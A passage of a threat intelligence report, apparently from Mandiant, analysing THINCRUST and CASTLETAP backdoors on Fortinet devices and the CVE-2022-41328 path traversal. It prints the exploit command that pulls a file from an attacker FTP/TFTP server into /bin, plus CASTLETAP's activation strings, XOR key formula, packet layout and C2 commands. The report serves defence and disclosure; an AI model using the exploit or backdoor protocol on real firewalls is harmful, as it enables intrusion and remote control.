<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%"><table>
<tbody>
<tr>
<td style="border:1px solid #000000;padding:16px"><strong>ID</strong></td>
<td style="border:1px solid #000000;padding:16px"><strong>Command</strong></td>
</tr>
<tr>
<td style="border:1px solid #000000;padding:16px"><code>1</code></td>
<td style="border:1px solid #000000;padding:16px"><code>Execute the command line stored in 'key'</code></td>
</tr>
<tr>
<td style="border:1px solid #000000;padding:16px"><code>2</code></td>
<td style="border:1px solid #000000;padding:16px"><code>Write the contents of the HTTP request to the file stored in 'key'. The contents are RC4 encrypted</code></td>
</tr>
<tr>
<td style="border:1px solid #000000;padding:16px"><code>3</code></td>
<td style="border:1px solid #000000;padding:16px"><code>Read the contents of the file stored in 'key' and transfer the contents RC4 encrypted to the client</code></td>
</tr>
</tbody>
</table></div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
<div style="color:#5f6368;display:block;font-size:16px;font-style:italic;margin-top:8px;width:100%;text-align:center">Table 1: get_device_info backdoor capabilities</div>
</div>
<p>While most files in <code>views.py</code> had the <code>@login_required</code> decorator applied to them [decorators are any functions (Syntax to call decorator: @) that extend the behavior of another function without explicitly modifying the code], the malicious function <code>get_device_info</code> utilized the Django python module native to the system to add a <code>@csrf_exempt</code> decorator to the function as seen in Figure 5. This means that the POST request to the malicious API call did not require a login or CSRF token to successfully run.</p></span></section><section class="QzPuud"><div><section><figure class="NEBdNd"><section class="PBkdHd DhGbH" jscontroller="SCGBie" jsaction="rcuQ6b:npT2md"><img class="JcsBte mZzdH ZOnyjc" src="https://storage.googleapis.com/gweb-cloudblog-publish/images/fig5-fortinet-malware-ecosystem_ymlk.max-800x800.png" alt="https://storage.googleapis.com/gweb-cloudblog-publish/images/fig5-fortinet-malware-ecosystem_ymlk.max-800x800.png" jsname='P3Vluc' jsaction="click:HTIlC" loading="lazy"/><section class="glue-modal glue-modal--dark QHdDac" role="dialog" aria-modal="true"><img class="JcsBte mZzdH ZOnyjc" src="https://storage.googleapis.com/gweb-cloudblog-publish/images/fig5-fortinet-malware-ecosystem_ymlk.max-800x800.png" alt="https://storage.googleapis.com/gweb-cloudblog-publish/images/fig5-fortinet-malware-ecosystem_ymlk.max-800x800.png" jsname='P3Vluc' jsaction="click:HTIlC" loading="lazy"/><button class="glue-modal__close-btn" tabindex="0" aria-label="Close this modal"></button></section></section></figure><div class="nRhiJb-cHYyed nRhiJb-DbgRPb-R6PoUb-ma6Yeb ZpqjUe"><span class="dQQu7c" jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip ssk='5:kbe95'><p>Figure 5: @login_required vs @csrf_exempt decorators</p></span></div></section></div></section><section class="Wy08Ac nRhiJb-qJTHM-OWXEXe-hJDwNd nRhiJb-DbgRPb-II5mzb-cGMI2b"><span class="dQQu7c" jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip ssk='5:kbe95'><p>Mandiant identified that a variant of this malicious API call was also present on a FortiAnalyzer device. While the backdoor function in <code>views.py</code>, <code>get_device_info</code>, was the same as FortiManager, the API call used to access the backdoor was changed to <code>/p/utils/fortigate_syslog_send</code> on the FortiAnalyzer device, as seen in Figure 6.</p></span></section><section class="QzPuud"><div><section><figure class="NEBdNd"><section class="PBkdHd DhGbH" jscontroller="SCGBie" jsaction="rcuQ6b:npT2md"><img class="JcsBte mZzdH ZOnyjc" src="https://storage.googleapis.com/gweb-cloudblog-publish/images/fig6-fortinet-malware-ecosystem_tjji.max-800x800.png" alt="https://storage.googleapis.com/gweb-cloudblog-publish/images/fig6-fortinet-malware-ecosystem_tjji.max-800x800.png" jsname='P3Vluc' jsaction="click:HTIlC" loading="lazy"/><section class="glue-modal glue-modal--dark QHdDac" role="dialog" aria-modal="true"><img class="JcsBte mZzdH ZOnyjc" src="https://storage.googleapis.com/gweb-cloudblog-publish/images/fig6-fortinet-malware-ecosystem_tjji.max-800x800.png" alt="https://storage.googleapis.com/gweb-cloudblog-publish/images/fig6-fortinet-malware-ecosystem_tjji.max-800x800.png" jsname='P3Vluc' jsaction="click:HTIlC" loading="lazy"/><button class="glue-modal__close-btn" tabindex="0" aria-label="Close this modal"></button></section></section></figure><div class="nRhiJb-cHYyed nRhiJb-DbgRPb-R6PoUb-ma6Yeb ZpqjUe"><span class="dQQu7c" jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip ssk='5:kbe95'><p>Figure 6: FortiAnalyzer variant of urls.py: fortigate_syslog_send</p></span></div></section></div></section><section class="Wy08Ac nRhiJb-qJTHM-OWXEXe-hJDwNd nRhiJb-DbgRPb-II5mzb-cGMI2b"><span class="dQQu7c" jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip ssk='5:kbe95'><h3>Exploitation of CVE-2022-41328 on FortiGate Devices</h3>
<p>After persistence was established across the FortiManager and FortiAnalyzer devices with the THINCRUST backdoor, the threat actor deployed FortiManager scripts to multiple FortiGate firewalls. This activity was logged in the FortiGate elog as seen in Figure 7.</p>
<p> </p>
<pre><code>vd=&quot;root&quot;
type=&quot;event&quot;
subtype=&quot;system&quot;
level=&quot;notice&quot; logdesc=&quot;Upload and run a script&quot;
user=”Fortimanager_Access”
ui=&quot;fgfmd&quot;
msg=&quot; User Fortimanager_Access via fgfmd upload and run script: &lt;script_id&gt; -- OK&quot;</code></pre>
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;display:block;font-size:16px;font-style:italic;margin-top:8px;width:100%;text-align:center">Figure 7: FGFM script deployment log entry</div>
</div>
<p>The threat actor deleted these FortiManager scripts from the FortiManager device before they could be recovered for analysis, but correlation of multiple event log types show that the scripts took advantage of a path traversal vulnerability (CVE-2022-41328). The vulnerability was exploited by the threat actor using the command <code>execute wireless-controller hs20-icon upload-icon</code> (as seen in Figure 8). This command allowed the threat actor to overwrite legitimate files in a normally restricted system directory. Normally, the <code>execute wireless-controller hs20-icon upload-icon</code> command is used to upload .ico files (icon files) from a server to a FortiGate firewall using the File Transfer Protocol (“FTP”) or Trivial File Transfer Protocol (“TFTP”), where they can be used in HotSpot 2.0 Online Sign-Up (OSU) portals. HotSpot 2.0 is a technology which allows for devices to seamlessly switch between cellular data and public Wi-Fi.</p>
<p>However, the <code>execute wireless-controller hs20-icon upload-icon</code> command suffered from two issues. The command did not validate the type of file being uploaded and was susceptible to a directory traversal exploit allowing a threat actor with Super Administrator privileges to upload a file smaller than 65,535 bytes to any location on the file system. This means that outside of the size constraints of the command,­­ a threat actor could replace any legitimate system file on the FortiGate firewall.</p>
<p>Successful exploitation of the vulnerability (CVE-2022-41328) is not logged in FortiGate elogs. Around the time of the FortiManager script execution, the elogs recorded the threat actor’s failed attempts to overwrite the system file <code>/bin/lspci</code> using this exploit, seen in Figure 8.</p>
<p> </p>
<pre><code>execute wireless-controller hs20-icon upload-icon ftp ../../../../../../bin/lspci &lt;TA FTP Server&gt;</code></pre>
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;display:block;font-size:16px;font-style:italic;margin-top:8px;width:100%;text-align:center">Figure 8: FortiGate elog failed command execution</div>
</div>
<div>
<p> </p>
<pre><code>execute wireless-controller hs20-icon upload-icon tftp ../../../../../../bin/lspci &lt;TA TFTP Server&gt;</code></pre>
<p>Fortinet confirmed the exploitation of this command was not seen prior to these events and assigned the designation CVE-2022-41328. Fortinet successfully replicated the exploit using the syntax seen in the failed command events.</p>
</div>
<p>Further supporting evidence of attempted exploitation was found in FortiGuard logs events with “<code>file_transfer: TFTP.Server.Buffer.Overflow repeated X times</code>” in the <code>msg</code> field. These events showed connections from the FortiGate firewalls to the FortiAnalyzer device, where the packet contents included the <code>lscpi</code> directory traversal string, as seen in Figure 9. A directory traversal string with the filename <code>node</code> was also referenced in a similar event, which is another binary in the <code>/bin/</code> directory of a FortiGate 6.2.7 device, but Mandiant only observed the threat actor replacing the <code>lscpi</code> binary successfully.</p>
<p> </p>
<pre><code>PFBBVFRFUk5TPiAAATsuLi88L1BBVFRFUk5TPgo8VVJJPiA8L1VSST4KPEhFQURFUj4gPC9IRUFERVI+CjxCT
0RZPiA8L0JPRFk+CjxQQUNLRVQ+IAABLi4vLi4vLi4vLi4vLi4vLi4vYmluL2xzcGNpAG9jdGV0ADwvUEFDS0
VUPg==
Base 64 Decoded
&lt;PACKET&gt; ..../../../../../../bin/lspci.octet.&lt;/PACKET&gt;</code></pre>
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;display:block;font-size:16px;font-style:italic;margin-top:8px;width:100%;text-align:center">Figure 9: IPS Sensor Logs - Attack Context Field</div>
</div>
<h3>Symlink to Suspected Backdoor (/bin/lspci -&gt; /bin/sysctl)</h3>
<p>Mandiant reviewed file listings from multiple FortiGate firewalls in search of modified versions of <code>/bin/lspci</code> based on the failed commands seen within FortiGate logs. In total, two variants of <code>/bin/lspci</code> were identified; a standalone version of the binary and a version which was symlinked to <code>/bin/sysctl</code>. Fortinet confirmed that <code>/bin/lspci</code> should always be a standalone binary.</p>
<p>File listing entries for <code>/bin/lspci</code> and <code>/bin/sysctl</code> on the compromised FortiGate firewalls contained similar timestamps that did not align with other legitimate binaries on the FortiGate machines. Additionally, the file size for <code>/bin/sysctl</code> on the compromised FortiGate firewall was much larger than reported on non-compromised devices.</p>
<p>Under normal circumstances, the command ‘<code>diagnose hardware lscpi</code>’ is used to list PCIe devices connected to the FortiGate firewall, but once the threat actor replaced the legitimate <code>lspci</code> binary with a symlink, the diagnostic command could execute the <code>sysctl</code> file the threat actor modified instead.</p>
<p>The file listing snippets in Figure 10 and Figure 11 highlight the differences across the original and modified versions of <code>/bin/lspci</code> and <code>/bin/sysctl</code> present on the FortiGate firewalls.</p>
<p> </p>
<pre><code>COMPROMISED-FGT101F # fnsysctl ls -la /bin
...
lrwxrwxrwx    1 root     root             9 Oct 18 13:09 lldptx -&gt; /bin/init
lrwxrwxrwx    1 root     root             9 Oct 18 13:09 lnkmtd -&gt; /bin/init
lrwxrwxrwx    1 root     root            11 Oct 19 05:11 lspci -&gt; /bin/sysctl
lrwxrwxrwx    1 root     root             9 Oct 18 13:09 lted -&gt; /bin/init
lrwxrwxrwx    1 root     root             9 Oct 18 13:09 memuploadd -&gt; /bin/init
...
-rwxr-xr-x    1 root     root       1478216 Oct 19 05:11 sysctl
...</code></pre>
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;display:block;font-size:16px;font-style:italic;margin-top:8px;width:100%;text-align:center">Figure 10: Compromised FortiGate firewall with malicious entries for /bin/lspci and /bin/sysctl</div>
</div>
<div>
<p> </p>
<pre><code>NON-COMPROMISED-FGT101F # fnsysctl ls -la /bin
...
lrwxrwxrwx    1 0        0       Fri Sep  2 12:07:55 2022         9 lldptx -&gt; /bin/init
lrwxrwxrwx    1 0        0       Fri Sep  2 12:07:55 2022         9 lnkmtd -&gt; /bin/init
-rwxr-xr-x    1 0        0       Fri Sep  2 12:07:55 2022    131736 lspci
lrwxrwxrwx    1 0        0       Fri Sep  2 12:07:55 2022         9 lted -&gt; /bin/init
lrwxrwxrwx    1 0        0       Fri Sep  2 12:07:55 2022         9 memuploadd -&gt; /bin/init
...
-rwxr-xr-x    1 0        0       Fri Sep  2 12:07:55 2022    251480 sysctl
...</code></pre>
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;display:block;font-size:16px;font-style:italic;margin-top:8px;width:100%;text-align:center">Figure 11: Non-Compromised FortiGate firewall with legitimate entries for /bin/lspci and /bin/sysctl</div>
</div>
<p>In addition to the differences in modification time and size, the output of the file listing command <code>fnsysctl ls -l /bin</code> displayed multiple fields in different formats and order. This is likely due to the threat actor replacing <code>/bin/sysctl</code> and therefore changing the shell functionality on the FortiGate firewall. Changes made to the FortiOS file system are not persistent, so the files were unable to be recovered for analysis.</p>
<p>By default, Fortinet devices running FortiOS have an archive on disk labelled <code>rootfs.gz</code> within the <code>/data/</code> partition. Upon boot, this file is mounted as the root filesystem. This means if modifications are made to the mounted image, the changes will not be persistent unless they are written to the <code>rootfs.gz</code> archive. FortiGate firewalls do not support files being exported from the mounted filesystem during runtime. Since the modifications made to <code>/bin/lspci</code> and <code>/bin/sysctl</code> were not written to the <code>rootfs.gz</code> archive, they were not installed persistently and could not be further analyzed.</p>
<p>Mandiant coordinated with Fortinet to obtain a forensic image of the compromised FortiGate firewalls and better identify the expected contents of the devices. Comparing the forensic image of the compromised FortiGate firewall to a known-good version, Fortinet identified a trojanized firmware that contained a persistent backdoor. Mandiant refers to the backdoor as a new malware family named CASTLETAP.</p>
<h3>CASTLETAP (FortiGate Firewall Backdoor)</h3>
<p>Analysis on the FortiGate firewalls identified an additional malicious file <code>/bin/fgfm</code>. Analysis of <code>/bin/fgfm</code> determined it to be a passive backdoor, named CASTLETAP, that listened for a specialized ICMP packet for activation. The threat actor likely named the file ‘<code>fgfm</code>’ in an attempt to disguise the backdoor as the legitimate service ‘<code>fgfmd</code>’ which facilitates communication between the FortiManager and FortiGate firewalls.</p>
<p>Once executed, CASTLETAP created a raw promiscuous socket to sniff network traffic. CASTLETAP then filtered and XOR decoded a 9-byte magic activation string in the payload of an ICMP echo request packet. Table 2 shows the magic strings interpreted by CASTLETAP and their resultant actions.</p>
<br>
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%"><table>
<tbody>
<tr>
<td style="border:1px solid #000000;padding:16px"><strong>Magic String</strong></td>
<td style="border:1px solid #000000;padding:16px"><strong>Description</strong></td>
</tr>
<tr>
<td style="border:1px solid #000000;padding:16px"><em>1qaz@WSXa</em></td>
<td style="border:1px solid #000000;padding:16px">Parse C2 information from ICMP payload and connect to it over SSL.</td>
</tr>
<tr>
<td style="border:1px solid #000000;padding:16px">hpaVAj2FJ</td>
<td style="border:1px solid #000000;padding:16px">Kills CASTLETAP process.</td>
</tr>
</tbody>
</table></div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
<div style="color:#5f6368;display:block;font-size:16px;font-style:italic;margin-top:8px;width:100%;text-align:center">Table 2: CASTLETAP magic string options</div>
</div>
<p>To decode the C2 information within the ICMP packet, a single-byte XOR key was derived from the Epoch date stamp to decrypt the payload data. This meant the encoding standard changed every day. Figure 12 show the formula that was used to calculate the XOR key.</p>
<p><code><strong>((year + 1900 + month * (year + 1900)) * date) % 255</strong></code></p>
<ul>
<li><code><strong>year: index starting from 1900 i.e. current_year-1900</strong></code></li>
<li><code><strong>month: index starting from 0</strong></code></li>
<li><code><strong>date: index starting from 1</strong></code></li>
</ul>
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;display:block;font-size:16px;font-style:italic;margin-top:8px;width:100%;text-align:center">Figure 12: CASTLETAP XOR key calculation</div>
</div>
<p>Table 3 defines the payload structure of the ICMP packet expected by CASTLETAP.</p>
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%"><table border="1" style="border-collapse:collapse;width:100%">
<tbody>
<tr>
<td style="width:29.0107%">
<p><strong>Byte Index/Range</strong></p>
</td>
<td style="width:70.9893%">
<p><strong>Payload Section Description</strong></p>
</td>
</tr>
<tr>
<td style="width:29.0107%">
<p><code>&lt;0x00-0x01&gt;</code></p>
</td>
<td style="width:70.9893%">
<p><code>&lt;flag indicating whether to create clone or not&gt;</code></p>
</td>
</tr>
<tr>
<td style="width:29.0107%">
<p><code>&lt;0x01-0x02&gt;</code></p>
</td>
<td style="width:70.9893%">
<p><code>&lt;unused&gt;</code></p>
</td>
</tr>
<tr>
<td style="width:29.0107%">
<p><code>&lt;0x02-0x0c&gt;</code></p>
</td>
<td style="width:70.9893%">
<p><code>&lt;9-byte magic string + null byte&gt;</code></p>
</td>
</tr>
<tr>
<td style="width:29.0107%">
<p><code>&lt;0x0c-0x10&gt;</code></p>
</td>
<td style="width:70.9893%">
<p><code>&lt;XOR encoded C2 IP&gt;</code></p>
</td>
</tr>
<tr>
<td style="width:29.0107%">
<p><code>&lt;0x10-0x15&gt;</code></p>
</td>
<td style="width:70.9893%">
<p><code>&lt;XOR encoded port&gt;</code></p>
</td>
</tr>
</tbody>
</table></div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
<br>
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;display:block;font-size:16px;font-style:italic;margin-top:8px;width:100%;text-align:center">Table 3: CASTLETAP ICMP packet structure</div>
</div>
<p>When the C2 IP address and port was parsed from the activation packet, CASTLETAP initiated a connection to the C2 over an SSL socket. Once this connection was established, CASTLETAP expected the C2 server to initiate a handshake with the 16-byte sequence seen in Figure 13, echoing the same sequence in response.</p>
<pre><code>0x58, 0x90, 0xAE, 0x86, 0xF1, 0xB9, 0x1C, 0xF6, 0x29, 0x83, 0x95, 0x71, 0x1D, 0xDE, 0x58, 0x0D</code></pre>
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;display:block;font-size:16px;font-style:italic;margin-top:8px;width:100%;text-align:center">Figure 13: CASTLETAP handshake sequence</div>
</div>
<p>Once connected to the C2, CASTLETAP could accept multiple types of commands over SSL, as seen in Table 4.</p>
<br>
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%"><table>
<tbody>
<tr>
<td style="border:1px solid #000000;padding:16px"><strong>Command</strong></td>
<td style="border:1px solid #000000;padding:16px"><strong>Description</strong></td>
</tr>
<tr>
<td style="border:1px solid #000000;padding:16px">0x1</td>
<td style="border:1px solid #000000;padding:16px">Upload file (to victim)</td>
</tr>
<tr>
<td style="border:1px solid #000000;padding:16px">0x2</td>
<td style="border:1px solid #000000;padding:16px">Download file (from victim)</td>
</tr>
<tr>
<td style="border:1px solid #000000;padding:16px">0x3</td>
<td style="border:1px solid #000000;padding:16px">Spawn <em>busybox</em> based command shell, otherwise fallback to a normal command shell.</td>
</tr>
<tr>
<td style="border:1px solid #000000;padding:16px">0x4</td>
<td style="border:1px solid #000000;padding:16px">Continue receiving</td>
</tr>
<tr>
<td style="border:1px solid #000000;padding:16px">0x5</td>
<td style="border:1px solid #000000;padding:16px">Receive complete</td>
</tr>
</tbody>
</table></div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
<div style="color:#5f6368;display:block;font-size:16px;font-style:italic;margin-top:8px;width:100%;text-align:center">Table 4: CASTLETAP command key</div>
</div>
